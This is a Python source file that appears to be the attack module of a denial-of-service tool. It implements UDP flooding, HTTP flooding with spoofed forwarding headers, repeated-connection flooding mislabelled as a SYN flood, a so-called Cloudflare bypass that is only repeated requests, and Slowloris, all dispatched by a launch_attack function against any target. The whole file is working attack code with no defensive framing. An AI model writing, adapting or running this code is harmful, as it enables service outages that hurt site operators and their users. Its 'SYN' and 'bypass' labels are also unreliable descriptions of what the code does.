# attack_methods.py
import time
import socket
import random
import threading
import ssl
import struct
import requests
from urllib.parse import urlparse
import dns.resolver
import socks
import cloudscraper

# Global variables for user-agent rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
]

# Thread limiter to prevent overloading client system
MAX_THREADS = 100
active_threads = threading.Semaphore(MAX_THREADS)

def resolve_target(target):
    """Resolve a target (URL or IP) to IP address and port"""
    try:
        # If it's already an IP:port format
        if ":" in target and not target.startswith("http"):
            parts = target.split(":")
            if len(parts) == 2:
                return parts[0], int(parts[1])
        
        # Parse URL if it starts with http/https
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
        else:
            # Assume it's a domain without scheme
            hostname = target
            port = 80  # Default to port 80
        
        # Resolve hostname to IP
        ip = socket.gethostbyname(hostname)
        return ip, port
    except Exception as e:
        raise ValueError(f"Could not resolve target: {target} - {str(e)}")

def attack_udp_god(target, duration):
    """Enhanced UDP flood with controlled resource usage"""
    ip, port = resolve_target(target)
    
    threads_count = 10  # Reduced to prevent client overload
    packet_size = 1024  # Reduced packet size
    
    def flood():
        with active_threads:
            data = random._urandom(packet_size)
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Use context manager to ensure socket is closed
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.settimeout(1)  # Add timeout to prevent hanging
                        # Send multiple packets per connection
                        for _ in range(50):  # Reduced packets per socket
                            if time.time() >= end_time:
                                break
                            s.sendto(data, (ip, port))
                except socket.error:
                    # Handle socket errors gracefully without affecting client
                    time.sleep(0.1)
                except Exception:
                    time.sleep(0.1)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_http_flood(target, duration):
    """Enhanced HTTP flood with better resource management"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    threads_count = 30  # Reduced thread count to prevent client overload
    
    # Enhanced headers and paths
    paths = [
        "/", "/wp-admin.php", "/admin/login", "/api/v1/users",
        "/search", "/checkout", "/cart", "/product/123",
        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts"
    ]
    
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH"]
    
    def build_request(target_ip):
        method = random.choice(methods)
        path = random.choice(paths)
        
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {target_ip}",
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            f"Accept-Language: en-US,en;q=0.5",
            f"Accept-Encoding: gzip, deflate, br",
            f"Cache-Control: no-cache",
            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
            f"X-Real-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
            f"Connection: keep-alive",
            f"Upgrade-Insecure-Requests: 1",
        ]
        
        if method == "POST":
            headers.extend([
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {random.randint(100, 500)}"  # Reduced size
            ])
        
        return "\r\n".join(headers) + "\r\n\r\n"
    
    def flood():
        with active_threads:
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Use context manager for proper socket cleanup
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(3)  # Reasonable timeout
                        
                        if use_ssl:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                                ssock.connect((ip, port))
                                request = build_request(ip)
                                ssock.sendall(request.encode())
                        else:
                            sock.connect((ip, port))
                            request = build_request(ip)
                            sock.sendall(request.encode())
                            
                        # Short delay between requests
                        time.sleep(0.05)
                            
                except Exception as e:
                    # Handle errors without affecting client
                    time.sleep(0.1)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_tcp_syn(target, duration):
    """TCP SYN flood attack with controlled resource usage"""
    ip, port = resolve_target(target)
    
    threads_count = 5  # Reduced thread count for raw sockets require privileges
    
    def syn_flood():
        with active_threads:
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    # Raw sockets require admin privileges, so we'll use a fallback
                    # if not available to prevent client system issues
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((ip, port))
                    s.close()
                except:
                    try:
                        # Fallback to regular SYN packets without raw sockets
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        s.connect((ip, port))
                        s.close()
                    except:
                        pass
                time.sleep(0.01)
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=syn_flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_cloudflare_bypass(target, duration):
    """Cloudflare bypass with better error handling"""
    # Extract hostname from URL if needed
    if target.startswith("http"):
        parsed = urlparse(target)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        url = target
    else:
        hostname = target
        port = 80
        url = f"http://{target}"
    
    threads_count = 20  # Reduced thread count
    
    def bypass_attack():
        with active_threads:
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    # Use requests with proper session management
                    session = requests.Session()
                    session.headers.update({
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                    })
                    
                    response = session.get(url, timeout=5)
                    session.close()
                    
                except Exception as e:
                    pass
                finally:
                    time.sleep(0.1)  # Prevent overwhelming client system
    
    # Start threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=bypass_attack)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_slowloris(target, duration):
    """Improved Slowloris attack with better connection management"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    sockets_count = 200  # Reduced socket count
    sockets = []
    
    # Create initial sockets
    for _ in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=ip)
            
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            sockets.append(s)
        except:
            pass
    
    end_time = time.time() + duration
    
    # Keep connections alive
    while time.time() < end_time and sockets:
        for s in list(sockets):  # Use list copy to avoid modification during iteration
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except:
                try:
                    s.close()
                    sockets.remove(s)
                except:
                    pass
        time.sleep(10)  # Increased interval to reduce client load
    
    # Clean up
    for s in sockets:
        try:
            s.close()
        except:
            pass

# Attack dispatcher for easy calling
ATTACK_METHODS = {
    "udp": attack_udp_god,
    "http": attack_http_flood,
    "syn": attack_tcp_syn,
    "cloudflare": attack_cloudflare_bypass,
    "slowloris": attack_slowloris,
}

def launch_attack(method, target, duration):
    """Launch an attack with the specified method"""
    if method in ATTACK_METHODS:
        print(f"Starting {method} attack on {target} for {duration} seconds")
        ATTACK_METHODS[method](target, duration)
        print(f"{method} attack on {target} completed")
    else:
        print(f"Unknown attack method: {method}")
